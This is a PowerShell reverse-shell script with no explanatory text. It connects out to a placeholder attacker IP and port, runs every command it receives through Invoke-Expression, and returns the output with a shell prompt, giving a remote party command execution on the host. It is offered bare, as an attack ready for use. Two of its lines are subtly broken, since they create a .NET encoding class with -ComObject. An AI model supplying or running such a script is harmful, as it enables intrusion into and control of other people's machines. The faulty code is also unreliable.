$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP_ADDRESS", YOUR_PORT_NUMBER);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -ComObject System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $bytes = (New-Object -ComObject System.Text.ASCIIEncoding).GetBytes($sendback2);
    $stream.Write($bytes, 0, $bytes.Length);
    $stream.Flush();
}
$client.Close();
